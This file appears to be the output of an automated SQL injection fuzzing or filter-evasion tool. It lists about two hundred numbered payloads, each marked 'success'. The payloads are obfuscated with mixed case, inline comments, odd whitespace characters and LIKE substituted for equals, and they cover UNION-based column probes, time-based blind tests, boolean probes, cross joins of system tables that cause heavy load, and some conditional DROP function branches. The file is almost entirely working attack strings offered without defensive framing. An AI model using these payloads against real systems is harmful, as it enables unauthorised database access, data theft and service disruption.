0 success "0x1') union/**/all SElect null,null,null,null,null,null,null--/**/"
5 success '-5524) AS eoyk wHErE 7619 NOT LIKE 7620 union all sEleCt 6928,6928,6928,6928,6928,6928,6928,6928,6928-- '
9 success '1"\nWHeRe/*3cr*/\'Vw}\'<>\'Vw}v\'/*s}6:e*/aND/**/make_set(8403 LIKE 8403,8899)--\n'
11 success '1")/**/where/**/\'\nLL}\' not like \'\nLL}!\'\xa0waitfor delay \'0:0:0x5\'--\xa0W:'
15 success '1) or 0x113b LIKe (SeLect/**/count(*) frOm/**/sysusers aS sys1,sysusers aS sys2,sysusers as sys3,sysusers\x0caS sys4,sysusers as sys5,sysusers AS sys6,sysusers aS sys7) '
16 success "-3433') WHeRe 3148 LIKE 3148 union/**/all seLeCT/**/8307,8307,8307,8307,8307,8307,8307,8307-- V"
17 success "0x1'\xa0And 3707 LIKE (sELect count(*)\nFRom sysibm.systables As/**/t1,sysibm.systables AS t2,sysibm.systables As t3) "
22 success '-4926" wherE 281 like\x0b281 AND True oR 4339=5547# >'
36 success "1'/**/iN boolean mode)\xa0union all/**/seLECt null,null,null#/**/4e"
40 success '-9140"))/**/union/**/all sELeCT 1623,1623,1623,1623,0x657,0x657,1623,1623,1623# Y[^'
41 success '0x1) wHeRE\x0b7729 like 7729;iif(5257 liKE 5257 aND 704 LIKE 704,1,1/0) '
43 success "-4222')/**/union\nall/**/select\x0b9267,9267,9267,9267,9267,9267--/*qZ6.f*/"
48 success "0x1')/**/union\x0ball/**/select/**/null,null,null--\n"
49 success "-9771' or/**/5113 like 5365/*x=4*/"
57 success "-(SELECT 2411)/**/or/**/('e'\tLIKE 'e' OR 8942<>8942)*4906# pxwg "
93 success '-7444))) OR 1342 LIKE 9774 '
94 success "-6587')\x0bunion/**/all/**/select 0x18cd,6349,6349,6349,6349,0x18cd,6349,6349,6349,0x18cd-- "
101 success '1 && (1977 LIKE 6852)*0x1ac4--/**/clxl '
103 success '-0x1846" union all seLeCt 0xcfb,3323#/**/4'
111 success "-2248'+(sELECT wuow wHERE 4421 LiKe 4421 union all SElect 4421,4421,4421,4421,4421,4421--/**/"
118 success '-1681%"/**/union all SElECT 8180,8180,8180,8180,8180,8180,8180,8180,(SElEcT/**/8180),8180# '
119 success '-2817)\nwhere/**/7216 IN (7215,7216,7217)/*j$U|1*/oR 3266=1102 '
121 success '-3638" union all SeLecT 4394,4394,4394,4394,4394,4394,4394-- '
122 success "(SELeCt/*J[$*/0x1)' union\tall/**/sElECT/**/null,null,null,null,null,null,null,null,null,null# `}"
125 success "1 WhERE 'y8' NOT LIKE 'y8{' oR False and 9660 LIKE (SElEcT count(*) From all_users t1,all_users/**/t2,all_users t3,all_users t4,all_users\x0ct5)-- "
140 success "1 And\xa0elt('C:'/**/lIKE 'C:',7259)#/**/lwyo 2m"
143 success '-6086" union\x0ball SEleCt 8700,8700,8700,8700--\xa0'
146 success "1 waitfor delay '0:0:5'--/**/nnnp GC"
147 success "0x1' WhEre 4759 not like 4760;sELECT count(*) FROm all_users t1,all_users/**/t2,all_users\x0bt3,all_users t4,all_users t5-- "
149 success "0x1' Where 7166 LiKE 7166 OR 0 Or 0 union all\x0cseLeCt null# "
157 success '-1653 union all/**/select\x0b8415,8415,8415,8415,8415,8415,8415,8415#\xa0'
159 success '-3710))/**/union all SELEct 5770,5770,5770,5770,5770,5770,5770# '
164 success '-3104" union\nall SELEct 5717,5717,5717,5717,5717,5717,5717,5717,5717-- '
175 success '1%" AND\n0x53f liKe 5939# '
180 success '-3321" whERE\n\'n\' not like \'ni\'\xa0union all selECT 0x643,0x643,1603,1603# '
183 success '1 union/**/all select\x0cnull,null,null,null,null,null,null,null,null,null#\x0b'
186 success '1 WheRE 0x184d LIke 6221 aND 9254 LIKE (sELeCT\x0ccount(*)/**/from rdb$fields As t1,rdb$types as t2,rdb$collations/**/AS t3,rdb$functions aS t4)-- Yc'
200 success "-0xae9')\twHERe 2621 lIkE 0xa3d/**/union/**/all seLecT 2621# "
208 success '1 OR 4411 LiKe (sELECt count(*) FrOm sysusers As sys1,sysusers As sys2,sysusers/*9f*/as\tsys3,sysusers AS sys4,sysusers As sys5,sysusers AS sys6,sysusers aS sys7)-- ctdx '
209 success '0x1 wheRe 4003 LIKE 4003 union all sELECt null-- '
215 success "1'\x0cwHEre 4272=4272 oR False union/**/all seleCT null,null,null,null# "
241 success "-6220' union/**/all\xa0select 1462,1462# D\x0b"
242 success "1) As afxc wHere '^' LIKE '^';SeLeCt/*sG*/count(*) fRoM rdb$fields As t1,rdb$types As\xa0t2,rdb$collations AS t3,rdb$functions as t4-- <"
250 success '-1351" where/**/6968=6968/**/or 0x1634 like 8582 '
259 success '1,iif(1440/**/like\n4612,1,1/0) '
264 success "-9721'\xa0||/**/elt(9511 LIKE 9238,9238) "
272 success "-2602' union/**/all SeLECT 5715,5715,5715,5715,5715,5715,5715,5715,5715-- "
274 success '-8143)/**/union all SElECT 3014--\x0b'
277 success "-7065'+(select 'bdxr'\tWHeRe 1756 liKe 1756 oR False union all SeLEcT 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756# "
279 success '0x1") Where \'U\' NOT LIKE \'U;\'\tunion/**/all sElEct/**/null,null,null,null,null,null,null,null--/**/'
281 success "-4947' order/**/by 1# c"
283 success "0x1)) As tnhy whERe '&' LikE/**/'&' aND 2858 like 7324# "
286 success "1'\xa0Or 8315 LIKE (SELecT count(*)/*C:A+*/fROM sysibm.systables As t1,sysibm.systables as t2,sysibm.systables aS t3) "
289 success '(sELEct (CAsE\x0bwHen\x0b(9525 LiKE 9280)\x0bTHEN 0x2535 elSe 9525*(SElEcT 9525 fRom master..sysdatabases) enD)) '
292 success "-3300' union all sElecT\t8979,8979,8979,0x2313,8979,8979-- "
300 success "-5728)\x0cwHERe '''!=''>' union/*\\$66*/all SeleCT 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#\nh,"
302 success "-6512'+(select 'zdjx'/**/whErE 8763 IN (8762,8763,8764) order by\n0x1-- "
315 success '0x1";SElect/**/count(*) fRoM/**/all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 '
319 success '1 Or 0x93f like (SelEcT count(*) FRom rdb$fields AS t1,rdb$types As t2,rdb$collations AS t3,rdb$functions AS t4)-- '
336 success '-0xb60") AS eizh whERE 2223 LikE 0x8af oR make_set(1041 LIKE 3056,3056)-- K'
344 success "-(sElECT 3794)')/**/union all Select 0x9b5,2485,2485,2485,2485-- "
355 success '0x1;seleCT/**/sleep(0x5)\t'
380 success "iNsert/**/into [dimcustomer] sElecT geographykey,a.customerid,a.firstname,a.middlename,a.lastname,a.suffix,a.emailaddress FRom saleslt.customer a inner join/**/saleslt.customeraddress b oN a.customerid \nLikE  b.customerid inner join dimgeography c On c.geographyalternatekey  lIkE  b.addressid IF object_id('dbo.dimdate')\nis\x0cnot null "
386 success '-4865 WhErE 6516 LIKE 6516 OR 0 union all seLECT 0x56a,1386,(SELECT 1386),1386# '
389 success '-6803") order/**/by\x0c1# T'
393 success "-9725')/**/union\tall/**/SElect 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--/**/"
396 success '-8945)) AS fszo\x0cWhEre 2320 LIKE 2320/*@*/union all/**/seLEct (SeLECt 2320)-- '
406 success "-8133') union/**/all sELecT 0x1911,6417,6417,6417,6417,6417,6417,6417-- _<"
408 success "-2046') union/**/all seLEct 6668,6668-- _M3"
411 success "-3633') WherE 3513 LIkE (Select 3513) union/**/all SELEcT 3513,(sELECT\t3513),3513,3513,3513,3513,0xdb9,3513,3513,3513# c"
412 success "-2483' WhERe 0x52f lIke 1327\x0cunion all SELECt 1327# "
413 success '0x1")\tunion/**/all Select null,null,null# '
430 success '-7683") where/**/(SELECT 9664) LIKE\xa09664/**/union all select/**/9664,9664,(SELECT 9664),9664,9664,9664,9664# _'
448 success "0x1'\tunion all\tSELeCt null,null,null,null,null,null,null,null,null--/**/Y"
450 success '1" WHeRE 8333/**/lIke 8333;seLECt pg_sleep(0x5)-- '
457 success "1' where 'k+{F-'<>'k+{F-[' union all/**/select null,null,null,null,null-- "
459 success "1';waitfor delay '0:0:5'\x0cand 'fjpf' like/*[S*/'fjpf "
472 success "1/**/where 5389 NOT LIKE 5390 waitfor/**/delay '0:0:5'-- "
473 success '-3126))/**/union all SELeCT 6718,6718,6718,6718,(SELeCT 6718)-- '
485 success "-1187')/**/union\tall SElECT 0x200a,8202,8202,8202,8202,8202,8202#\x0bJ"
491 success "-1550' IN boolean mode)\tunion all/**/selECt 0x2631,9777,9777--\x0b"
492 success "0x1%'\x0corder\tby 0x1--/*-|*/"
503 success '1)) aS jzzo WHEre 0x24ed NOT LIKE 9454 Or 0x0 And 2754 not like 2755 AND True union all/**/SeLecT null,null,null,null,null# |'
511 success '1" union all/**/SElect/*[@^\x0c*/null,null-- '
515 success '-5322" union all selEcT\t6494,6494,6494,6494,0x195e,6494--\x0c{'
522 success '-2936)/**/or 8642 NOT LIKE 8643 '
528 success "-3596')/*0Oq*/union all Select 5349,0x14e5,5349,5349,5349,5349# "
530 success "0x1'+(sElEcT iowv WHERe 6105 like 6105 OR False And sleep(5)# "
534 success "1%';sELECt * FRom generate_series(4592,4592,CAsE When (4278/*d*/NOT\x0bLIKE 4279) THeN 1 eLSe 0 ENd)\tlimit 1-- "
537 success '-2838"\nwHeRE 3066 not like 3067 aNd 9177<>9178 and 0x1 union all SELeCT 5442# !t'
542 success '-8432) union/**/all sElecT 8169,8169,8169,8169,(SElEcT 8169),8169,8169,8169,8169,8169--\x0b'
547 success '0x1") AS\thtyo/**/WHERe 8322 LIKE 8322 anD \'m\' like \'m\'# z'
550 success "(SELECT 0x1)' where 'b' LIKE 'b' AND True\x0cwaitfor delay '0:0x0:5'-- "
551 success "-7876%')/*]9q\x0bt*/union all seleCt 3909,3909,3909,0xf45,3909#\x0c"
555 success 'select @shipdate =\xa0dateadd(day,6,@orderdate),\xa0@duedate LIKE\t/*7`*/dateadd(day,12,@orderdate) '
561 success "0x1' in boolean\x0bmode)/**/union all/*[yh*/select null,null#\nR1V"
565 success 'set @dateto  LIKE\n isnull (@dateto, getdate())/*V|~\x0c$*/'
568 success '0x1) union/**/all SELeCT null,null,null-- O'
570 success '1 where 9353 NOT LIKE 9354 and 4498 IN (4497,4498,4499)--/*l8k\t*/^'
575 success "0x1%' union all/**/SELECt null,null,null,null,null,null--\n"
577 success "-1170'/**/union\x0call SElecT 4663,0x1237,4663,4663,4663,4663,4663,4663#/*dG0Y,*/1w"
588 success '1")\x0baS fcrx wHerE/**/5408 like 5408 or 6447/**/NOT LIKE 6447 or/**/9851 lIkE 9852 and 2820 LIKE 5133 '
591 success '-4919)/**/union\tall\tSELeCT 2608,2608,2608,2608,2608,0xa30# '
594 success "-8364')/*\tK2*/union\xa0all SElECT 4732,4732,4732,(SElecT 4732),4732,4732,4732,4732,(sELECt 4732)#\xa0"
605 success '0x1")\x0cAs jidc where/*|v:\\.*/\'d\' NOT LIKE \'d6\' aNd 0x1080<>(sElECt 4225) aND\xa0\'I\' NOT LIKE \'I>\'--  '
614 success "1)) aS syot wheRe/*?*/6000 NOT LIKE 6001;waitfor/**/delay '0:0:5'--\to"
623 success '-9762)/**/oR elt(0x168d like 8986,8986) '
624 success "1'+(seLect\tsijr/*r*/wHERe 9703 in\x0b(9702,9703,9704);iF(1665 LIke\x0c3845) selEct 1665 ElSe dROP/*FvG*/function nzod--\xa0"
626 success "sELECt prod_subcategory_desc aS subcategory,/**/calendar_month_desc aS month, amount_sold\nas sales, sum(amount_sold) over (order by prod_subcategory_id, calendar_month_desc) AS cum_sales FrOM prodcat_monthly_sales wHerE calendar_year_id  LIKE '1803' order by prod_subcategory_id, calendar_month_id "
636 success '-2610%")/**/union all SeLEcT 7779,0x1e63,7779,7779,7779-- '
637 success '-8625 oR 3176=2519# fvgl '
639 success '-3071)) AS uiiu WhERE 8910/**/like 0x22ce oR\tFalse union all SELECT 8910,8910,(SELECT 8910),8910,0x22ce,8910,8910# '
642 success '1);sELect * FRoM generate_series(7610,7610,CaSE WHeN (7610 lIke 9416) thEn 1 elsE 0/**/ENd) limit 0x1-- '
649 success '-8071))/**/OR\n9160 LIKE/**/4253\n'
651 success '-4318")/*Hu:?*/AS vpvt wHERe 5543=5543 anD 1 union/**/all SEleCt 5543,5543,0x15a7,5543,5543,5543--/**/'
660 success '1) aS uuro whERE 0x1619 lIKe 5657 || 1303<>1303;If(7899\x0bLike (SeLeCT 0x1edb)) SELeCt 7899 elSE DROP function zbbp--/*h3Y:~*/i/'
662 success '1")\x0cunion/**/all/**/SELECt null,null,null,null,null#\x0b'
671 success "-5652%') union/**/all/**/SeLect 0x115f,4447,4447,4447,4447,4447,0x115f,4447,4447-- mD"
673 success '-4885 union all/**/select 4589,4589,0x11ed,4589,4589,4589,4589,4589,4589,4589# '
674 success "selECt p.id, p.producttypeid, producttype/**/ LIKE  pt.name, p.code, p.name, p.sysid, p.sortorder, active = casE p.active WHEN 1 TheN 'y' ElsE 'n' enD, p.createdby, p.createdon, p.lasteditby, p.lastediton,\x0csi.branchid, dt.groupname, dt.suplvl1name FROm products p inner join saleitems si On si.productuid  like  p.id inner join producttypes pt ON pt.id = p.producttypeid inner join directorytreeproductsmap dtpm ON p.id = dtpm.productid inner join vwdirectorytreehierarchy dt ON dt.groupid = dtpm.directorytreeid WHerE p.active = 1 ANd si.branchid in (0, @branchid) eND "
685 success '-2168"))\x0bunion/**/all SEleCt 0x1347,4935,4935,4935,4935,4935,4935,4935,4935-- '
686 success "-0x895'\xa0union all selECt (SelECt 8065),8065,(selECT 8065),8065-- "
694 success "-5970' wheRe\x0b2769 like 0xad1 AND True union all sELEct 2769-- "
713 success '-3829%") union/*SW>*/all/**/select\n2218,2218,2218,(SELECT\x0b2218),2218,(SELECT/**/2218),2218--/*$u]}*/Eq'
715 success "(seLEct 1)',(CaSe wHEn 2872 lIKE 2872 THen\t1 ELse/**/null End) "
729 success "1'+(SELecT/**/lang WHerE 6672<>0x1a11 union all\nSELeCT null,null#\x0b"
732 success "-5516'+(select 'bmlv' wHeRe 3068 not like 3069 union all sELecT 7188,7188,7188,7188,7188,7188,7188,0x1c14# "
738 success "-0x2650'\tin/**/boolean/*g6*/mode)/*.^1; */union all\x0bSEleCT 2528,2528,2528,0x9e0,2528,2528,(sELEcT 2528)-- #"
741 success '-1499) as\x0bgxfm WhEre 9762=9762 oR 0x1765/**/LIKE 4782-- '
742 success '1)/**/and make_set(1709 IN (1708,1709,1710),8899) '
750 success '-9119") whEre 5057 IN/**/(5056,5057,5058) AND True Or \'Ng\' lIKe \'Ng\'--\x0b'
763 success '1) As iiku WHere 0x24fa like 9466 OR False AND True;seLEct/**/(CAsE WHeN (5847 LIKE 2826) THEN 5847\xa0ElSE cast(1 AS int)/(sELEcT 0 FRom dual) End) FROM dual--\n'
781 success "-8588' union/**/all SELect 2135,2135-- D2"
812 success "-8023' oR\xa06872 like (SelEct 6872)/*[,*/"
817 success '0x1;begin/**/dbms_lock.sleep(0x5);/**/end--/**/'
823 success '0x1) wHere\n0x1d01 like 7425 union all sELeCT null,null,null,null,null,null,null,null,null,null--/**/'
825 success "1' where/**/2873 LIKE 2873 OR 0 waitfor delay '0:0:5'-- "
837 success "-5026'\x0bwherE 83<>84 OR 6927 lIKe 6928/**/union all SEleCt 7324,7324-- aeS"
841 success '-0x10eb) aS inpx WherE (SELECT 9804)/**/like 9804 union\x0call SELEcT\n9804# 8X'
855 success '1 whErE 4944 like 4944 union all SELect null,null,null,null,null,null,null,null,null# '
859 success '-0x1531 WHERe 8851=8851 union/**/all SeLECT\t5933,5933,5933-- '
862 success "1' wHerE 6406 lIkE 6406;SeleCT count(*) FrOm rdb$fields AS t1,rdb$types As t2,rdb$collations As t3,rdb$functions/**/aS t4-- "
868 success '-8015) where (SELECT 9808) like 9808\x0cOR 9323 LIKE 9323 OR 5224<>5224# um'
885 success '1;SElEcT\x0cpg_sleep(5)--/*/]l{v*/HM'
887 success "0x1'\tand/**/sleep(5)/**/"
904 success '-9891"\nunion/**/all\nselECT\x0b7489# '
907 success '0x1%")\xa0union/**/all selECT\x0bnull,null,null-- '
912 success '0x1%")\x0cunion/**/all sELeCT null,null-- 7'
956 success '-3445 union\x0call/**/select 5505,0x1581,5505--\n'
961 success '-9697)/**/union all sElEcT (SeLEcT 3052),3052,3052,3052,3052,3052,3052,3052,0xbec-- '
963 success '-5891) wHerE 5792 like (SELECT 5792)/**/union all SeLECt\n0x16a0,5792,5792,0x16a0,5792# ys$'
968 success '-8349) union/**/all\nsElECT 8126,8126#/*qt*/'
977 success '0x1 and/*gk#sc*/make_set(0x2546/**/like 0x22b8,0x22b8)-- idkn\nw6'
981 success '-4679 WHERE 0x25a2 LIKE 9634/**/union\tall sElECt (SELeCt 9634),9634,9634,9634,9634,9634,9634--\x0b<'
994 success "0x1 WHeRE 'X'/**/lIke 'X' Or/**/0 Or/**/False;selECT count(*) FROM domain.domains AS\x0bt1,domain.columns aS t2,domain.tables As t3-- <$"
1014 success "0x1' iN boolean mode) union/**/all SELeCT null-- "
1015 success "1%' aNd 0xa9c like\n(SElECT count(*)/**/FRom sysusers AS sys1,sysusers As sys2,sysusers AS sys3,sysusers aS sys4,sysusers As sys5,sysusers as sys6,sysusers AS sys7)-- "
1024 success "-5160') aS kgjw WHERE 6709<>6710 union all/**/seleCT 9609,9609-- "
1043 success '-8760" union all sElECT 2309,2309,2309,2309,2309,2309,2309,2309,2309# '
1050 success "1'+(SeLeCt\nniht wHErE 7294 LIKE 7294 AnD 3580 like (sELect count(*)\tFrOm domain.domains/**/aS\x0bt1,domain.columns as t2,domain.tables as t3)-- vk"
1058 success "1' WhERe 'g\rB'\x0bNOT/**/LIKE 'g\rBD' && True;seLect CaSe wheN 0x11b9=8418 tHEn 0x1 ElSE null enD-- i\x0c-M#^!X&"
1069 success '0x1) union all/**/SElecT\xa0null,null,null,null# '
1071 success "1'+(SElEct rwse WHERe 9843=9843 union/**/all/**/SELECT null,null,null,null,null,null,null--\x0c"
1073 success "0x1))\twaitfor/**/delay '0x0:0x0:0x5'-- "
1075 success '0x1%" oR/**/0x14ec LIKE (SElECt\ncount(*) fROM sysusers as sys1,sysusers aS sys2,sysusers As sys3,sysusers/**/as sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- '
1076 success "0x1'+(SElecT vfmy wheRe 783 In (782,783,784);iif(5214 LIKE 7412,1,0x1/0) "
1082 success "-1218'/**/union all SelECt 2663,2663,2663,2663-- "
1084 success '-0x17dd\x0bunion all SelEct 6784-- '
